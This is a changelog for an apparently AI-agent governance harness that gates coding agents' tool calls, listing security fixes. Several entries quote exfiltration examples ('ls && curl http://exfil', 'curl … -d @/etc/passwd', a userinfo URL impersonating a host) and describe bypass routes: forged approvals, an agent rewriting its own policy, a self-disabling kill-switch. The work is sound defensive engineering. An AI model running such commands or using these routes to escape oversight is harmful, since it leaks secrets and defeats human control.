# Changelog

Notable changes to the `harness` binary and the `ai2rules-harness` npm packages.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions
follow [semantic versioning](https://semver.org/spec/v2.0.0.html), with the caveat
that this is pre-1.0 software and the manifest schema is still moving.

Entries name the **finding number** or **decision record** behind a change where
there is one, so anything here can be traced to the reasoning in
[`DECISIONS.md`](DECISIONS.md) or [`docs/reviews/`](docs/reviews/).

## [Unreleased]

## [0.4.0] — 2026-08-14

Closes the last of the Codex-scan P2 findings. A minor bump rather than a patch
because an existing approval log will no longer load — deliberately, since an
unsigned entry cannot be told apart from a forged one.

### Migration

**If you have an approval log, delete it.** It lives beside your session state as
`approvals.jsonl`; removing it is safe and the only consequence is that any
approval still in force gets asked again. A key file is generated next to the new
log on first use — keep it `0600` and owned by you, or the store will refuse to
open rather than trust a key someone else can read.

Nothing else changes. The hook adapters, the gate ABI and manifest validation are
untouched by this release.

### Security

- **The approval log is signed, and approvals are bound to the policy that granted
  them** (finding #15, D67). The store is the one file whose contents *grant*
  something, and as plain append-only JSONL anything with write access could append
  a token already in the `Approved` state and manufacture a human decision that
  never happened. Every line now carries an HMAC-SHA256 under a key kept beside the
  log at `0600`, opened `O_NOFOLLOW`, with mode and ownership re-checked on every
  open; a line that does not verify fails the whole load rather than being skipped,
  because a modified grant record is not one to keep answering from — and no
  approvals simply means the human is asked again. `manifest_hash` joins the
  binding, so an approval no longer survives a rewrite of the rules it was granted
  under while the world keeps its id.

  **Breaking for any existing approval log**: unsigned lines cannot be told apart
  from forged ones, so an old log is refused rather than honoured. Delete it; the
  affected approvals are re-asked.

## [0.3.1] — 2026-08-14

Finishes the P2 sweep from the self-review: four security fixes, each closing a
control that was present and enforcing nothing, plus a pinned toolchain so "the
checks pass" means the same thing here as it does in CI.

**One behaviour change worth knowing before you upgrade.** The web handler now
honours the network policy it was always given, and `ExecEnv.network` defaults to
`Disabled` — so if you drive the in-process agent loop and expect a web fetch to
work, you must now grant the egress explicitly. The deployed hook adapters
(`cc-hook`, `agy-hook`, `gate`) are decision-only and never execute, so they are
unaffected. Nothing else here takes away a capability that worked before.

### Changed

- **The Rust toolchain is pinned** in `rust-toolchain.toml`. CI resolved
  `stable` while the dev machine's `stable` was fifteen months older, so "clippy is
  clean" described a compiler nobody else ran and a lint error reached `main`. The
  pin is the version CI was already using, so CI is unchanged and the developer
  moved to meet it. The workflows no longer name a version — one source of truth.

### Security

- **Secrets embedded in values are masked in the audit log** (finding #17, D66).
  Redaction matched keys and dotted paths only, so a bearer token inside
  `command`, an `api_key` in a `url`, or a password in a clone URL was written to
  the trace verbatim. Every string value is now scanned and only the
  secret-shaped span is masked, so the surrounding command stays auditable. The
  detectors are few and high-confidence — issuer-defined prefixes (`ghp_`, `AKIA`,
  `AIza`, `sk-`, JWTs), PEM private-key blocks, `Authorization`/`Cookie` header
  values, secret-bearing query parameters, and URL userinfo passwords. Entropy
  guessing is deliberately excluded: a redactor that guesses corrupts the record
  and trains readers to ignore the mask.
- **The web handler enforces the spec's `NetworkPolicy`** (finding #12, D65). It
  previously fetched whatever URL the spec carried, so `NetworkPolicy::Disabled`
  still made the request. `Disabled` now refuses and `AllowHosts` matches the URL's
  real host — parsed so that userinfo cannot impersonate an allowed host
  (`https://docs.example@evil.example/`), with loopback, link-local and private
  targets requiring an explicit allowlist entry rather than being reachable through
  a broad one. **Note:** `ExecEnv.network` defaults to `Disabled` and nothing sets
  it, so a caller that wants a web fetch must now grant the egress. That the field
  was inert is why nobody noticed it was unconfigured.
- **A timed-out command takes its descendants with it** (finding #11, D65).
  `child.kill()` signalled only the direct child, so `sleep 300 &` outlived its
  parent's timeout — and a surviving descendant holding the inherited stdout pipe
  meant the reader thread never saw EOF, so the timeout path could block forever
  instead of bounding anything. The child now gets its own process group and the
  group is killed. Windows still lacks a Job Object and is documented as such.
- **`hero-mcp` defaults to `HERO_ELICIT=require`** (finding #18). It defaulted to
  `auto`, so a host with no elicitation channel silently satisfied the human gate
  and let caller-controlled prompt content drive the already-authenticated `agy`.
  An approval that cannot reach a human is a denial. The spawned `agy` also
  inherits an allowlisted environment rather than the whole shell's, so a
  prompt-injection surface cannot reach cloud keys or registry tokens.

## [0.3.0] — 2026-08-14

A security release, and the first with breaking changes. All three come from one
place: a control that existed, read as active, and enforced nothing. Fixing each
meant refusing input that was previously accepted — so the break is the fix, not a
side effect of it.

Everything here came out of the self-review that also produced 0.2.2; the full
write-up is in
[`docs/reviews/2026-08-12-full-codebase-review.md`](docs/reviews/2026-08-12-full-codebase-review.md).

### Migration

Three things to check. Each fails loudly with a message naming the field, so
nothing changes silently.

1. **Does your manifest declare `command_classes` without `default_to`?** It will
   no longer compile. Add a catch-all pointing at an approval-required,
   network-effectful action — that bucket is what makes classification safe, since
   pattern matching over shell strings is always evadable.
2. **Does it declare two classifiers for the same action?** It will no longer
   compile. Merge them; only the first ever ran.
3. **Do you call the `harness gate` wire ABI directly** (rather than through
   `cc-hook` / `agy-hook`, which handle this for you) **against a world declaring a
   counted budget?** Send `context.usage` — `{}` is valid and means "nothing used
   yet". Omitting it now returns `DENY` / `missing_usage`. `command_timeout_ms`
   alone does not count as a counted budget.

All six manifests shipped in this repository already satisfy 1 and 2.

### Security

- **Manifest budgets are now enforced** (D64). `Budget` and its limit checks were
  complete, but every decision path constructed a zeroed `BudgetUsage`, so each
  call was evaluated as the session's first and `max_commands_per_task`,
  `max_network_calls`, `max_file_writes` and `max_tokens_per_session` were
  decorative in every manifest declaring them. Counters are now carried session
  state, exactly like taint: `context.usage` in and out of the gate ABI, persisted
  by the adapters in a `usage-<session>` sidecar, held in memory by the long-lived
  gateway and orchestrator. Charged only on an ALLOW that will actually run, so a
  refusal never pushes a session toward its limit. **Breaking** — see Migration 3.
  This is the fourth fail-closed hardening of ABI v1, after `taint`,
  `source_channel` and `path`, and like those it does not bump `v`: a version bump
  would let a caller pin v1 and keep running ungoverned.
- **Command classification no longer lets declaration order decide a verdict**
  (finding #17, D63). Every class is evaluated; a command claimed by two different
  classes resolves to `default_to` rather than to whichever was declared first. A
  world listing a permissive class ahead of a restrictive one previously classified
  `ls && curl http://exfil` by its `ls` prefix, so a tainted session was allowed to
  run egress that bare `curl` was denied. Ranking classes by severity was rejected:
  no semantic ordering over `SideEffectClass` exists, and deriving one from enum
  declaration order would encode policy in enum layout.
- **A `command_classes` classifier must declare `default_to`, and an action may
  have only one classifier** (findings #19/#20, D62). Both are compile errors now.
  `default_to` is the fail-closed bucket an evasion lands in, so its optionality
  was the real hole — a manifest without one let a tainted session run arbitrary
  unmatched shell. A second classifier for the same action silently never ran.
  **Breaking** — see Migration 1 and 2.

### Changed

- The cross-host demo prefers the freshly built debug binary over
  `target/release/harness`. `check-demos.sh` builds debug and then runs the demo,
  so a stale release binary lying around meant the guard could validate a
  two-day-old kernel — which it did, passing locally while CI, with no release
  build, correctly failed. A guard that can check the wrong artifact is the same
  family of bug as the three above.
- Test count 261 → 269.

### Known issues

Open findings are tracked as issues on
[`agentic-execution-governance`](https://github.com/sv-pro/agentic-execution-governance/issues):
`source_channel` is pinned to `user_prompt` on live hosts, so manifest channel
trust is inert (#22); argument aliasing and schema validation are mutually
exclusive, so a schema-bearing action fails on Antigravity (#23). An over-budget
verdict is `REPLAN`, and no host exposes a "propose a smaller step" channel, so
adapters fall through to the host's own prompt rather than denying.

## [0.2.2] — 2026-08-13

A security release. Everything in it came out of a full review of our own
repository, which found five live defects behind a green test suite, a clean
linter, and five passing CI jobs. Full write-up:
[`docs/reviews/2026-08-12-full-codebase-review.md`](docs/reviews/2026-08-12-full-codebase-review.md).

**Upgrade if you use path scope (`roots`), or run the harness anywhere its state
directory might not be writable.** Both failures below are silent by construction:
nothing in a session tells you the governance stopped applying.

### Fixed

- **An unrecordable taint escalation is no longer allowed** (finding #16, D59).
  Both host adapters discarded write errors when persisting the monotonic taint
  marker. With an unwritable state directory the escalation was recorded nowhere
  and every later call read back `clean` — so a `WebFetch` followed by
  `curl … -d @/etc/passwd` was permitted, and in `--grant` mode explicitly
  allowed, with the taint floor never engaging. The marker is now written durably
  and its failure fails **closed**, scoped to the single call that would escalate;
  the rest of the session keeps working. Failing to *reach* a decision still fails
  open, as documented.
- **`agy-hook` canonicalizes manifest roots** (finding #15). It resolved action
  paths through the filesystem but compared root rules as text, so a `Deny` root
  reached through a symlink stopped matching and fell through to the policy
  default. The same manifest and the same target file produced `deny` on Claude
  Code and `force_ask` on Antigravity — or an explicit `allow` into a
  `Deny`/`Credential` root under a permissive default.
- **`harness gate` resolves manifest roots** (finding #26, D61). The CLI compiled
  the manifest itself and never resolved roots, so relative rules, `~` rules and
  symlinked rules silently did not bind for anyone driving the wire ABI directly.
- **The committed WASM artifact matches the kernel again** (finding #18, D60). The
  browser playground's engine was nine preview-affecting commits stale and
  reporting version `0.0.1`. It exports `preview`, not `gate`, so this
  misdescribed the kernel rather than exposing it — a fidelity bug, not an
  exploitable one.

### Added

- `SECURITY.md` — reporting channel, and an explicit statement of what the harness
  does *not* protect against: it is advisory rather than a sandbox, command
  classification is a heuristic whose fail-closed default carries the weight, and
  `source_channel` is currently pinned to `user_prompt` on live hosts (#21).
- This changelog.
- **Path-scope conformance** (D61): `docs/demos/one-kernel/roots-world.yaml` and
  `roots-cases.yaml`, fourteen cases asserting identical verdicts across the
  in-process kernel, the `harness gate` CLI, and both host adapters. The previous
  case set contained no path cases at all, which is why #15 and #26 survived. One
  rule deliberately points at a symlink; both fixes were reverted in turn to
  confirm the tests fail without them.
- **A `wasm` CI job** that rebuilds the engine and requires the committed artifact
  to answer identically — same version, same bundled default world, same `preview`
  output over a case set including `roots` and `command_classes`. Semantic rather
  than byte comparison, so a toolchain bump does not produce a false failure.

### Changed

- Test count 254 → 259. A flaky `ETXTBSY` in the `init` suite is fixed (#25): it
  reproduced on roughly two of every five runs that had just recompiled — which is
  every CI run — while being nearly invisible locally.

### Known issues

Open findings, all documented in the review and now tracked as issues on
[`agentic-execution-governance`](https://github.com/sv-pro/agentic-execution-governance/issues):
`source_channel` is pinned to `user_prompt` on live hosts (#21); argument aliasing
and schema validation are mutually exclusive (#27). (#17, #19 and #20 are fixed in
Unreleased, above.)

## [0.2.1] — 2026-08-12

No user-facing change. The entire release is the publish path, and all three fixes
came from it failing in ways nothing else would have caught.

### Fixed

- npm dist-tags are derived from the version, so a prerelease can no longer become
  `latest`.
- `setup-node` no longer writes an empty-token `.npmrc`, which made npm present a
  broken credential instead of falling back to OIDC.
- Both publish steps skip already-published versions, so a partial failure can be
  retried.

### Changed

- First release published with **no credential of any kind**: OIDC trusted
  publishing, provenance signed automatically, no tokens on the account and no
  secrets in the repository. Verified by three release candidates.

## [0.2.0] — 2026-08-11

### Changed

- **The npm package ships per-platform binaries as optional dependencies and runs
  no install script** (D58). Installing previously ran a `postinstall` that
  fetched a binary over the network, unpacked it via `tar`, and `chmod`ed it
  executable — a step-by-step description of the thing scanners exist to catch.
  The binary now arrives as an `optionalDependencies` entry npm resolves by
  `os`/`cpu`, covered by the integrity hash already in your lockfile. No network,
  no shell, no `chmod` at install time.
- The Windows platform package is named `…-windows-x64`; `win32` in an unscoped
  name is rejected by npm's spam filter.

### Fixed

- npm publishing is idempotent after a partial failure.

## [0.1.2] — 2026-08-10

Three defects found by real use, all the same shape: the enforcement depending on
something the thing being enforced upon could reach.

### Fixed

- **The control plane is read-only.** The agent could rewrite the policy binding
  it.
- **The kill-switch moved out of the governed project.** It was self-disabling.
- The hook command is cross-host: no environment variable, no relative path, no
  double quotes.

### Changed

- Published unscoped on npm as `ai2rules-harness`, license texts included in the
  tarball.

## [0.1.1] — 2026-08-09

### Fixed

- Two `harness init` defects found in review: silent under-coverage, and writes
  through symlinks.

## [0.1.0] — 2026-08-08

First version a stranger can install and use: `harness init` writes a starter
manifest, the `PreToolUse` shim and the host settings entry, with nothing but the
binary — no checkout, no `cargo`, no `jq`.

[Unreleased]: https://github.com/sv-pro/ai2rules/compare/v0.4.0...HEAD
[0.4.0]: https://github.com/sv-pro/ai2rules/compare/v0.3.1...v0.4.0
[0.3.1]: https://github.com/sv-pro/ai2rules/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/sv-pro/ai2rules/compare/v0.2.2...v0.3.0
[0.2.2]: https://github.com/sv-pro/ai2rules/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/sv-pro/ai2rules/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/sv-pro/ai2rules/compare/v0.1.2...v0.2.0
[0.1.2]: https://github.com/sv-pro/ai2rules/compare/v0.1.1...v0.1.2
[0.1.1]: https://github.com/sv-pro/ai2rules/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/sv-pro/ai2rules/releases/tag/v0.1.0
